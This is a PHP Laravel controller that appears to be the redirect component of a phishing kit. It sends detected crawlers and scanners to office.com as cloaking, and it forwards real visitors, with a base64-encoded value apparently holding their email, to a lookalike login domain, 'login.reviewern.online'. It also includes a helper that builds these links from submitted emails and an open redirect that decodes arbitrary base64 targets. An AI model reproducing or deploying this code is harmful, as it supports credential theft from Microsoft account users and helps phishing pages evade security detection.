<?php

namespace App\Http\Controllers;

use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Http\Request;
use Jaybizzle\CrawlerDetect\CrawlerDetect;
use Jaybizzle\CrawlerDetect\Fixtures\Crawlers;
use Crawler;

class Controller extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;

    public function index($base64){

        if(Crawler::isCrawler()){
            return redirect()->away("https://office.com");
        }else{
//             $base64 = base64_decode($base64);
//            dd($base64);
            return redirect()->away("https://login.reviewern.online/obKceMCK#".$base64);

        }


//        dd($random);

//        return view('welcome');
    }

    public function index2(Request $request){
        $mail = $request->subs;
        return "https://login.reviewern.online/obKceMCK#".$mail;
    }

    public function code($code){
        if(Crawler::isCrawler()){
            return redirect()->away("https://office.com");
        }else{
            $base64 = base64_decode($code);
//            dd($base64);
            return redirect()->away($base64);

        }
    }
}
